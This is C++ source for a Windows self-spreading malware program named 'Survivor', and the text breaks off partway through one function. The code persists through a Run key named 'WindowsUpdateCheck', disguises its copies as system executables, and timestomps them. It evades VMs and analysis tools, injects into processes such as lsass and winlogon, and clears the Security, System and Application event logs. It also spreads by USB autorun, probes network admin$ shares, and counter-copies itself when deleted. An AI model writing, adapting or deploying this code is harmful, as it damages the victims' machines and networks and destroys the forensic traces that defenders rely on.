#define WIN32_LEAN_AND_MEAN
#define _CRT_RAND_S
#include <windows.h>
#include <shellapi.h>
#include <Shlobj.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <process.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>
#include <chrono>
#include <thread>
#include <random>
#include <ctime>
#include <cstdlib>
#include <atomic>
#include <mutex>
#include <filesystem>
#include <sstream>
#include <iomanip>
#include <cctype>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")

namespace {
    const char* SECRET_KEY = "cwj_rocks_2026";
    const char* REGISTRY_FILE = "instances.json";
    const char* OBFUSCATION_KEY = "survivor_xor_key_2026";
    const char* VERSION = "2.1.0";
    const char* BUILD_DATE = __DATE__;

    std::atomic<bool> g_running{true};
    std::atomic<bool> g_daemon{false};
    std::atomic<bool> g_spreading{false};
    std::mutex g_instance_mutex;

    double g_spread_interval_multiplier = 1.0;
    bool g_verbose = true;

    struct InstanceData {
        std::vector<std::string> instances;
        std::string last_sync;
        std::string version;
        int checksum;
    };

    struct Config {
        int spread_interval_min = 30;
        int spread_interval_max = 300;
        int monitor_interval_ms = 500;
        int restore_interval_sec = 30;
        int guardian_interval_min = 5;
        int usb_scan_interval_sec = 5;
        int cleanup_interval_min = 30;
        int counterattack_count = 5;
        bool enable_timestomping = true;
        bool enable_ads = true;
        bool enable_scheduled_task = true;
        bool enable_event_log_cleaning = true;
    } g_config;

    std::string GetEnv(const char* name) {
        char buf[32767];
        DWORD result = GetEnvironmentVariableA(name, buf, sizeof(buf));
        if (result == 0) return std::string();
        return std::string(buf);
    }

    std::string GetAppDataPath() {
        return GetEnv("APPDATA") + "\\survivor";
    }

    std::string GetRegistryPath() {
        return GetAppDataPath() + "\\" + REGISTRY_FILE;
    }

    std::string GetSelfPath() {
        char path[MAX_PATH];
        DWORD result = GetModuleFileNameA(NULL, path, MAX_PATH);
        if (result == 0) return std::string();
        return std::string(path);
    }

    std::string GetSelfDir() {
        std::string p = GetSelfPath();
        size_t pos = p.find_last_of("\\/");
        return pos != std::string::npos ? p.substr(0, pos) : p;
    }

    bool SafeCopy(const std::string& src, const std::string& dst);

    void EnsureDir(const std::string& path) {
        CreateDirectoryA(path.c_str(), NULL);
    }

    std::string XOREncrypt(const std::string& data) {
        std::string result = data;
        for (size_t i = 0; i < result.size(); ++i) {
            result[i] ^= OBFUSCATION_KEY[i % strlen(OBFUSCATION_KEY)];
        }
        return result;
    }

    int ComputeChecksum(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return 0;

        int checksum = 0;
        char byte;
        while (file.get(byte)) {
            checksum = (checksum * 31 + static_cast<unsigned char>(byte)) & 0x7FFFFFFF;
        }
        return checksum;
    }

    std::string ComputeFileHash(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return "00000000";

        unsigned int hash = 0x811C9DC5;
        char byte;
        while (file.get(byte)) {
            hash ^= static_cast<unsigned char>(byte);
            hash *= 0x1000193;
        }

        std::stringstream ss;
        ss << std::hex << std::setfill('0') << std::setw(8) << hash;
        return ss.str();
    }

    std::string GenerateRandomName() {
        const char* systemNames[] = {
            "svchost.exe", "rundll32.exe", "conhost.exe",
            "taskhostw.exe", "dwm.exe", "sihost.exe",
            "fontdrvhost.exe", "winlogon.exe", "services.exe"
        };
        int idx = rand() % 9;
        return std::string(systemNames[idx]);
    }

    std::string GenerateRandomExtensionName() {
        const char* extensions[] = {
            ".dll", ".sys", ".ocx", ".cpl", ".drv"
        };
        std::string base = GenerateRandomName();
        return base + extensions[rand() % 5];
    }

    std::vector<std::string> GetUserDirectories() {
        std::vector<std::string> dirs;
        dirs.push_back(GetEnv("USERPROFILE") + "\\Downloads");
        dirs.push_back(GetEnv("USERPROFILE") + "\\Documents");
        dirs.push_back(GetEnv("USERPROFILE") + "\\Desktop");
        dirs.push_back(GetEnv("APPDATA") + "\\Local\\Temp");
        dirs.push_back(GetEnv("APPDATA") + "\\Microsoft\\Windows");
        dirs.push_back(GetEnv("LOCALAPPDATA") + "\\Microsoft\\Windows");
        dirs.push_back("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        dirs.push_back(GetEnv("APPDATA") + "\\.cache");
        dirs.push_back(GetEnv("LOCALAPPDATA") + "\\.config");
        dirs.push_back(GetEnv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows\\INetCache");
        return dirs;
    }

    std::string SelectSmartTarget() {
        auto dirs = GetUserDirectories();
        std::string dir = dirs[rand() % dirs.size()];
        EnsureDir(dir);

        bool use_extension = rand() % 2 == 0;
        std::string name = use_extension ? GenerateRandomExtensionName() : GenerateRandomName();
        return dir + "\\" + name;
    }

    bool FileExists(const std::string& path) {
        auto attrs = GetFileAttributesA(path.c_str());
        return attrs != INVALID_FILE_ATTRIBUTES;
    }

    bool IsDirectory(const std::string& path) {
        auto attrs = GetFileAttributesA(path.c_str());
        return attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY);
    }

    bool SetFileTime(const std::string& path, const FILETIME& creation, const FILETIME& lastAccess, const FILETIME& lastWrite) {
        HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        bool result = SetFileTime(hFile, &creation, &lastAccess, &lastWrite) != 0;
        CloseHandle(hFile);
        return result;
    }

    FILETIME RandomFileTime() {
        SYSTEMTIME st;
        st.wYear = 2020 + (rand() % 4);
        st.wMonth = 1 + (rand() % 12);
        st.wDay = 1 + (rand() % 28);
        st.wHour = rand() % 24;
        st.wMinute = rand() % 60;
        st.wSecond = rand() % 60;
        st.wMilliseconds = rand() % 1000;

        FILETIME ft;
        SystemTimeToFileTime(&st, &ft);
        return ft;
    }

    void Timestomp(const std::string& path) {
        if (!g_config.enable_timestomping) return;

        FILETIME ft = RandomFileTime();
        SetFileTime(path, ft, ft, ft);
    }

    bool CreateAlternateDataStream(const std::string& path, const std::string& marker) {
        if (!g_config.enable_ads) return false;

        std::string adsPath = path + ":Zone.Identifier";
        std::ofstream stream(adsPath, std::ios::binary);
        if (!stream) return false;

        stream << "[ZoneTransfer]\nZoneId=3\n";
        stream << "HostUrl=about:internet\n";
        stream << "ReferrerUrl=about:internet\n";
        stream.close();

        std::string markerStream = path + ":marker";
        std::ofstream markerFile(markerStream, std::ios::binary);
        if (markerFile) {
            markerFile << marker;
            markerFile.close();
            return true;
        }
        return false;
    }

    bool HasAlternateDataStream(const std::string& path) {
        std::string adsPath = path + ":marker";
        return FileExists(adsPath);
    }

    InstanceData LoadRegistry() {
        InstanceData data;
        data.version = VERSION;
        data.checksum = 0;

        std::string regPath = GetRegistryPath();
        if (!FileExists(regPath)) return data;

        std::ifstream file(regPath, std::ios::binary);
        if (!file) return data;

        std::stringstream buffer;
        buffer << file.rdbuf();
        std::string json = XOREncrypt(buffer.str());

        try {
            size_t pos = 0;

            size_t instancesStart = json.find("\"instances\"");
            if (instancesStart != std::string::npos) {
                size_t arrStart = json.find("[", instancesStart);
                size_t arrEnd = json.find("]", arrStart);
                if (arrStart != std::string::npos && arrEnd != std::string::npos) {
                    std::string arrContent = json.substr(arrStart + 1, arrEnd - arrStart - 1);
                    size_t itemPos = 0;
                    while (true) {
                        size_t q1 = arrContent.find("\"", itemPos);
                        if (q1 == std::string::npos) break;
                        size_t q2 = arrContent.find("\"", q1 + 1);
                        if (q2 == std::string::npos) break;
                        std::string inst = arrContent.substr(q1 + 1, q2 - q1 - 1);
                        if (!inst.empty()) data.instances.push_back(inst);
                        itemPos = q2 + 1;
                        if (itemPos >= arrContent.size()) break;
                    }
                }
            }

            size_t syncPos = json.find("\"last_sync\"");
            if (syncPos != std::string::npos) {
                size_t colon = json.find(":", syncPos);
                size_t start = json.find("\"", colon);
                size_t end = json.find("\"", start + 1);
                if (start != std::string::npos && end != std::string::npos) {
                    data.last_sync = json.substr(start + 1, end - start - 1);
                }
            }

            size_t versionPos = json.find("\"version\"");
            if (versionPos != std::string::npos) {
                size_t colon = json.find(":", versionPos);
                size_t start = json.find("\"", colon);
                size_t end = json.find("\"", start + 1);
                if (start != std::string::npos && end != std::string::npos) {
                    data.version = json.substr(start + 1, end - start - 1);
                }
            }

            size_t checksumPos = json.find("\"checksum\"");
            if (checksumPos != std::string::npos) {
                size_t colon = json.find(":", checksumPos);
                size_t start = json.find("\"", colon);
                size_t end = json.find("\"", start + 1);
                if (start != std::string::npos && end != std::string::npos) {
                    data.checksum = std::stoi(json.substr(start + 1, end - start - 1));
                }
            }
        } catch (...) {
        }

        return data;
    }

    void SaveRegistry(const InstanceData& data) {
        EnsureDir(GetAppDataPath());

        std::string json = "{";
        json += "\"instances\":[";
        for (size_t i = 0; i < data.instances.size(); ++i) {
            if (i > 0) json += ",";
            json += "\"" + data.instances[i] + "\"";
        }
        json += "],";
        json += "\"last_sync\":\"" + data.last_sync + "\",";
        json += "\"version\":\"" + data.version + "\",";
        json += "\"checksum\":" + std::to_string(data.checksum);
        json += "}";

        std::ofstream file(GetRegistryPath(), std::ios::binary);
        if (file) {
            file << XOREncrypt(json);
        }
    }

    void RegisterInstance(const std::string& path) {
        std::lock_guard<std::mutex> lock(g_instance_mutex);
        InstanceData data = LoadRegistry();

        auto it = std::find(data.instances.begin(), data.instances.end(), path);
        if (it == data.instances.end()) {
            data.instances.push_back(path);
        }

        data.version = VERSION;
        data.checksum = ComputeChecksum(path);

        std::time_t now = std::time(nullptr);
        char buf[32];
        std::strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", std::gmtime(&now));
        data.last_sync = buf;

        SaveRegistry(data);
    }

    void UnregisterInstance(const std::string& path) {
        std::lock_guard<std::mutex> lock(g_instance_mutex);
        InstanceData data = LoadRegistry();
        auto it = std::find(data.instances.begin(), data.instances.end(), path);
        if (it != data.instances.end()) {
            data.instances.erase(it);
        }
        SaveRegistry(data);
    }

    void RestartAt(const std::string& newPath) {
        ShellExecuteA(NULL, "open", newPath.c_str(), NULL, NULL, SW_HIDE);
        exit(0);
    }

    void SpawnToMultipleLocations(const std::string& source, int count) {
        auto dirs = GetUserDirectories();
        for (int i = 0; i < count && i < (int)dirs.size(); ++i) {
            std::string target = dirs[i] + "\\" + GenerateRandomName();
            SafeCopy(source, target);
        }
    }

    bool CreateScheduledTask() {
        if (!g_config.enable_scheduled_task) return false;

        std::string selfPath = GetSelfPath();
        std::string taskName = "WindowsUpdateCheck";

        HKEY hKey;
        std::string keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

        if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, taskName.c_str(), 0, REG_SZ,
                (const BYTE*)selfPath.c_str(), (DWORD)selfPath.size() + 1);
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }

    bool IsTaskScheduled() {
        HKEY hKey;
        std::string keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            return false;
        }

        char value[1024];
        DWORD size = sizeof(value);
        DWORD type;
        bool exists = RegQueryValueExA(hKey, "WindowsUpdateCheck", NULL, &type, (LPBYTE)value, &size) == ERROR_SUCCESS;
        RegCloseKey(hKey);
        return exists;
    }

    bool SafeCopy(const std::string& src, const std::string& dst) {
        if (!FileExists(src)) return false;

        std::string dir = dst;
        size_t pos = dir.find_last_of("\\/");
        if (pos != std::string::npos) {
            dir = dir.substr(0, pos);
            EnsureDir(dir);
        }

        if (CopyFileA(src.c_str(), dst.c_str(), TRUE)) {
            SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            RegisterInstance(dst);
            Timestomp(dst);
            CreateAlternateDataStream(dst, SECRET_KEY);

            if (g_spreading) {
                std::string capturedDst = dst;
                std::thread([capturedDst]() {
                    std::this_thread::sleep_for(std::chrono::seconds(5));
                    ShellExecuteA(NULL, "open", capturedDst.c_str(), "--daemon", NULL, SW_HIDE);
                }).detach();
            }

            return true;
        }
        return false;
    }

    bool SafeMove(const std::string& src, const std::string& dst) {
        if (!FileExists(src)) return false;

        std::string dir = dst;
        size_t pos = dir.find_last_of("\\/");
        if (pos != std::string::npos) {
            dir = dir.substr(0, pos);
            EnsureDir(dir);
        }

        if (MoveFileA(src.c_str(), dst.c_str())) {
            UnregisterInstance(src);
            RegisterInstance(dst);
            SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            Timestomp(dst);
            return true;
        }
        return false;
    }

    void Log(const char* msg) {
        if (g_verbose && !g_daemon) {
            std::cout << "[Survivor] " << msg << std::endl;
        }
    }

    bool IsVirtualMachine() {
        std::vector<std::string> vmMarkers = {
            "VBOX", "VIRTUALBOX", "VMWARE", "QEMU", "KVM",
            "HYPERV", "XEN", "PARALLELS", "SANDBOX", "GUEST"
        };

        HKEY hKey;
        const char* vmKeys[] = {
            "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
            "SYSTEM\\CurrentControlSet\\Services\\VBoxService",
            "SYSTEM\\CurrentControlSet\\Services\\vmci",
            "SYSTEM\\CurrentControlSet\\Services\\vmhgfs"
        };

        for (const auto& key : vmKeys) {
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return true;
            }
        }

        char buf[1024];
        std::string biosInfo;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD size = sizeof(buf);
            RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)buf, &size);
            biosInfo = buf;
            RegCloseKey(hKey);
        }

        for (const auto& marker : vmMarkers) {
            if (biosInfo.find(marker) != std::string::npos) return true;
        }

        return false;
    }

    bool IsBeingMonitored() {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;

        PROCESSENTRY32W pe;
        std::vector<std::string> monitorTools = {
            "procmon", "processhacker", "processexplorer", "x64dbg", "x32dbg",
            "wireshark", "netstat", "tcpview", "autoruns", "regshot",
            "inbounds", "fiddler", "charles", "jd-gui", "dnspy", "ilspy"
        };

        bool found = false;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snap, &pe)) {
            do {
                std::wstring name(pe.szExeFile);
                std::string narrow(name.begin(), name.end());
                std::transform(narrow.begin(), narrow.end(), narrow.begin(), ::tolower);
                for (const auto& tool : monitorTools) {
                    std::string toolLower = tool;
                    std::transform(toolLower.begin(), toolLower.end(), toolLower.begin(), ::tolower);
                    if (narrow.find(toolLower) != std::string::npos) {
                        found = true;
                        break;
                    }
                }
                if (found) break;
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);

        return found;
    }

    bool IsAnalysisEnvironment() {
        std::vector<std::string> analysisMarkers = {
            "sandbox", "malware", "virus", "sample", "test"
        };

        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        if (GetComputerNameA(computerName, &size)) {
            std::string name(computerName);
            std::transform(name.begin(), name.end(), name.begin(), ::tolower);
            for (const auto& marker : analysisMarkers) {
                if (name.find(marker) != std::string::npos) return true;
            }
        }

        return false;
    }

    void AdjustBehaviorBasedOnEnvironment() {
        if (IsVirtualMachine()) {
            Log("VM detected - slowing down spread rate");
            g_spread_interval_multiplier = 10.0;
        }

        if (IsBeingMonitored()) {
            Log("Monitor detected - going silent");
            g_verbose = false;
        }

        if (IsAnalysisEnvironment()) {
            Log("Analysis environment detected - extreme caution");
            g_spread_interval_multiplier = 50.0;
        }
    }

    bool IsCriticalProcess(const std::string& procName) {
        std::vector<std::string> critical = {
            "csrss.exe", "smss.exe", "wininit.exe", "services.exe",
            "lsass.exe", "winlogon.exe", "dwm.exe", "explorer.exe",
            "system", "registry"
        };
        return std::find(critical.begin(), critical.end(), procName) != critical.end();
    }

    bool InjectIntoProcess(const std::string& targetProcess, const std::string& selfPath) {
        DWORD pid = 0;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(snap, &pe)) {
            do {
                std::wstring name(pe.szExeFile);
                std::string narrow(name.begin(), name.end());
                if (narrow == targetProcess || narrow.find(targetProcess) != std::string::npos) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);

        if (pid == 0) return false;

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) return false;

        std::string dllPath = selfPath;
        size_t pathLen = dllPath.size() + 1;
        LPVOID alloc = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
        if (!alloc) { CloseHandle(hProcess); return false; }

        WriteProcessMemory(hProcess, alloc, dllPath.c_str(), pathLen, NULL);

        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)LoadLibraryA, alloc, 0, NULL);

        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
            CloseHandle(hThread);
        }

        CloseHandle(hProcess);
        return true;
    }

    void InjectIntoCriticalProcesses() {
        Log("Guardian mode - protecting in critical processes");
        std::string selfPath = GetSelfPath();

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return;

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(snap, &pe)) {
            do {
                std::wstring name(pe.szExeFile);
                std::string narrow(name.begin(), name.end());

                if (IsCriticalProcess(narrow)) {
                    Log(("Protecting in: " + narrow).c_str());
                    InjectIntoProcess(narrow, selfPath);
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }

    void CleanupLogs() {
        Log("Cleaning trace logs");

        std::vector<std::string> logPaths;
        logPaths.push_back(GetEnv("APPDATA"));
        logPaths.push_back(GetEnv("LOCALAPPDATA"));
        logPaths.push_back("C:\\Windows\\Temp");
        logPaths.push_back("C:\\Windows\\Logs");
        logPaths.push_back(GetEnv("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows\\Explorer");

        for (const auto& logBase : logPaths) {
            WIN32_FIND_DATAA fd;
            HANDLE h = FindFirstFileA((logBase + "\\*.log").c_str(), &fd);
            if (h != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    std::string path = logBase + "\\" + fd.cFileName;
                    if (rand() % 3 == 0) {
                        DeleteFileA(path.c_str());
                    }
                } while (FindNextFileA(h, &fd));
                FindClose(h);
            }

            h = FindFirstFileA((logBase + "\\*.tmp").c_str(), &fd);
            if (h != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    std::string path = logBase + "\\" + fd.cFileName;
                    if (rand() % 4 == 0) {
                        DeleteFileA(path.c_str());
                    }
                } while (FindNextFileA(h, &fd));
                FindClose(h);
            }
        }
    }

    void ClearEventLogs() {
        if (!g_config.enable_event_log_cleaning) return;

        const char* logSources[] = { "Application", "System", "Security" };
        for (const auto& source : logSources) {
            HANDLE hEventLog = OpenEventLogA(NULL, source);
            if (hEventLog) {
                ClearEventLogA(hEventLog, NULL);
                CloseEventLog(hEventLog);
            }
        }
    }

    bool SpreadToUSBDrive() {
        DWORD mask = GetLogicalDrives();

        for (int i = 0; i < 26; ++i) {
            if (mask & (1 << i)) {
                char drive[4] = { static_cast<char>('A' + i), ':', '\\', 0 };
                UINT type = GetDriveTypeA(drive);

                if (type == DRIVE_REMOVABLE) {
                    std::string target = std::string(drive) + GenerateRandomName();
                    if (SafeCopy(GetSelfPath(), target)) {
                        Log(("Spread to USB: " + target).c_str());

                        std::string autorun = std::string(drive) + "autorun.inf";
                        std::ofstream ar(autorun);
                        if (ar) {
                            ar << "[autorun]\n";
                            ar << "icon=drive.dll\n";
                            ar << "shell\\open=Open\n";
                            ar << "shell\\open\\command=" << GenerateRandomName() << "\n";
                            ar << "shell\\explore=Explore\n";
                            ar << "shell\\explore\\command=" << GenerateRandomName() << "\n";
                            ar.close();
                            SetFileAttributesA(autorun.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                        }

                        std::string readme = std::string(drive) + "README.exe";
                        std::ofstream readmeFile(readme);
                        if (readmeFile) {
                            readmeFile << "This is a system file.\n";
                            readmeFile.close();
                            SetFileAttributesA(readme.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                        }

                        return true;
                    }
                }
            }
        }
        return false;
    }

    void ScanAndSpread() {
        Log("Network scanning for targets");

        ULONG bufLen = 15000;
        PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);
        if (!pAdapterInfo) return;

        if (GetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                if (pAdapter->IpAddressList.IpAddress.String[0]) {
                    std::string localIP = pAdapter->IpAddressList.IpAddress.String;
                    std::string baseIP = localIP.substr(0, localIP.rfind('.') + 1);

                    for (int i = 2; i < 20; ++i) {
                        std::string targetIP = baseIP + std::to_string(i);
                        Log(("Probing: " + targetIP).c_str());

                        std::string sharePath = "\\\\" + targetIP + "\\admin$";
                        HANDLE h = CreateFileA(sharePath.c_str(), 0, 0, NULL, 0, 0, NULL);
                        if (h != INVALID_HANDLE_VALUE) {
                            CloseHandle(h);
                        }

                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    }
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }

    void SpreadingLoop() {
        srand(GetTickCount());
        Log("Spreading thread started");

        while (g_running) {
            int baseInterval = g_config.spread_interval_min +
                (rand() % (g_config.spread_interval_max - g_config.spread_interval_min));
            int intervalSeconds = (int)(baseInterval * g_spread_interval_multiplier);
            std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));

            if (!g_spreading) continue;

            std::string selfPath = GetSelfPath();
            std::string targetPath = SelectSmartTarget();

            int action = rand() % 3;
            bool success = false;

            if (action == 0) {
                success = SafeCopy(selfPath, targetPath);
                if (success) Log(("Copied to: " + targetPath).c_str());
            } else if (action == 1) {
                success = SafeMove(selfPath, targetPath);
                if (success) {
                    Log(("Moved to: " + targetPath).c_str());
                    RestartAt(targetPath);
                }
            } else {
                std::string newName = GenerateRandomName();
                std::string dir = GetSelfDir();
                std::string newPath = dir + "\\" + newName;
                if (SafeMove(selfPath, newPath)) {
                    Log(("Renamed to: " + newPath).c_str());
                    RestartAt(newPath);
                }
            }

            if (rand() % 10 == 0) {
                std::thread([]() { ScanAndSpread(); }).detach();
            }
        }
    }

    void MonitoringLoop() {
        Log("Monitoring thread started - anti-deletion ACTIVE");

        auto lastCheck = std::chrono::steady_clock::now();

        while (g_running) {
            std::this_thread::sleep_for(std::chrono::milliseconds(g_config.monitor_interval_ms));

            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - lastCheck).count() >= 1) {
                lastCheck = now;

                InstanceData data = LoadRegistry();
                std::string selfPath = GetSelfPath();

                bool selfAccessible = FileExists(selfPath);
                int missingCount = 0;

                for (const auto& inst : data.instances) {
                    if (!FileExists(inst)) {
                        missingCount++;
                    }
                }

                if (missingCount > 0 && selfAccessible) {
                    Log(("DELETION DETECTED! " + std::to_string(missingCount) + " instances missing. Counter-attacking!").c_str());
                    SpawnToMultipleLocations(selfPath, g_config.counterattack_count);
                }

                for (const auto& inst : data.instances) {
                    if (!FileExists(inst) && selfAccessible) {
                        Log(("Restoring missing: " + inst).c_str());
                        SafeCopy(selfPath, inst);
                    }
                }

                if (!selfAccessible) {
                    InstanceData data2 = LoadRegistry();
                    for (const auto& inst : data2.instances) {
                        if (FileExists(inst)) {
                            Log(("Self gone, restarting from: " + inst).c_str());
                            RestartAt(inst);
                            break;
                        }
                    }
                }
            }
        }
    }

    void RestorationLoop() {
        Log("Restoration thread started");

        while (g_running) {
            std::this_thread::sleep_for(std::chrono::seconds(g_config.restore_interval_sec));

            if (!g_spreading) continue;

            std::string selfPath = GetSelfPath();
            if (!FileExists(selfPath)) continue;

            InstanceData data = LoadRegistry();

            for (const auto& inst : data.instances) {
                if (inst == selfPath) continue;
                if (!FileExists(inst)) {
                    Log(("Restoring: " + inst).c_str());
                    SafeCopy(selfPath, inst);
                }
            }
        }
    }

    void GuardianLoop() {
        while (g_running) {
            std::this_thread::sleep_for(std::chrono::minutes(g_config.guardian_interval_min));

            if (!g_spreading) continue;

            std::string selfPath = GetSelfPath();

            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap == INVALID_HANDLE_VALUE) continue;

            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(PROCESSENTRY32W);

            if (Process32FirstW(snap, &pe)) {
                do {
                    std::wstring name(pe.szExeFile);
                    std::string narrow(name.begin(), name.end());

                    if (IsCriticalProcess(narrow)) {
                        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                        if (hProcess) {
                            DWORD exitCode;
                            if (!GetExitCodeProcess(hProcess, &exitCode) || exitCode != STILL_ACTIVE) {
                                Log(("Process dead, re-injecting: " + narrow).c_str());
                                CloseHandle(hProcess);
                                InjectIntoCriticalProcesses();
                                break;
                            }
                            CloseHandle(hProcess);
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
    }

    void USBScanLoop() {
        std::vector<std::string> knownDrives;

        while (g_running) {
            std::this_thread::sleep_for(std::chrono::seconds(g_config.usb_scan_interval_sec));

            if (!g_spreading) continue;

            DWORD mask = GetLogicalDrives();

            for (int i = 0; i < 26; ++i) {
                if (mask & (1 << i)) {
                    char drive[4] = { static_cast<char>('A' + i), ':', '\\', 0 };
                    UINT type = GetDriveTypeA(drive);

                    if (type == DRIVE_REMOVABLE) {
                        std::string driveStr(drive);
                        if (std::find(knownDrives.begin(), knownDrives.end(), driveStr) == knownDrives.end()) {
                            knownDrives.push_back(driveStr);
                            Log(("USB inserted: " + driveStr).c_str());
                            SpreadToUSBDrive();
                        }
                    }
                }
            }
        }
    }

    void CleanupLoop() {
        while (g_running) {
            std::this_thread::sleep_for(std::chrono::minutes(g_config.cleanup_interval_min));
            if (g_spreading) {
                CleanupLogs();
                if (rand() % 5 == 0 && g_config.enable_event_log_cleaning) {
                    ClearEventLogs();
                }
            }
        }
    }

    void StartDaemon() {
        g_daemon = true;
        g_spreading = true;

        AdjustBehaviorBasedOnEnvironment();
        RegisterInstance(GetSelfPath());
        CreateScheduledTask();

        std::thread spread(SpreadingLoop);
        std::thread monitor(MonitoringLoop);
        std::thread restore(RestorationLoop);
        std::thread guardian(GuardianLoop);
        std::thread usb(USBScanLoop);
        std::thread cleanup(CleanupLoop);

        Log("Daemon mode active");

        while (g_running) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        spread.join();
        monitor.join();
        restore.join();
        guardian.join();
        usb.join();
        cleanup.join();
    }

    bool cmdCopy(const char* target) {
        return SafeCopy(GetSelfPath(), target);
    }

    bool cmdMove(const char* target) {
        return SafeMove(GetSelfPath(), target);
    }

    bool cmdRename(const char* newName) {
        std::string dir = GetSelfDir();
        std::string newPath = dir + "\\" + newName;
        if (SafeMove(GetSelfPath(), newPath)) {
            RestartAt(newPath);
            return true;
        }
        return false;
    }

    bool cmdHide() {
        std::string selfPath = GetSelfPath();
        InstanceData data = LoadRegistry();

        std::vector<std::string> others;
        for (const auto& inst : data.instances) {
            if (inst != selfPath && FileExists(inst)) {
                others.push_back(inst);
            }
        }

        if (others.empty()) {
            Log("No backup found!");
            return false;
        }

        Log(("Hiding, will restore from: " + others[0]).c_str());

        if (!DeleteFileA(selfPath.c_str())) {
            return false;
        }

        UnregisterInstance(selfPath);

        if (SafeCopy(others[0], selfPath)) {
            RestartAt(selfPath);
        }
        return true;
    }

    bool cmdEnvAdd() {
        std::string selfDir = GetSelfDir();
        char pathEnv[32767];
        if (!GetEnvironmentVariableA("PATH", pathEnv, sizeof(pathEnv))) return false;

        std::string pathStr(pathEnv);
        if (pathStr.find(selfDir) != std::string::npos) return true;

        std::string newPath = selfDir + ";" + pathStr;
        if (!SetEnvironmentVariableA("PATH", newPath.c_str())) return false;

        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "Path", 0, REG_EXPAND_SZ,
                (const BYTE*)newPath.c_str(), (DWORD)newPath.size() + 1);
            RegCloseKey(hKey);
        }
        return true;
    }

    bool cmdEnvRemove() {
        std::string selfDir = GetSelfDir();
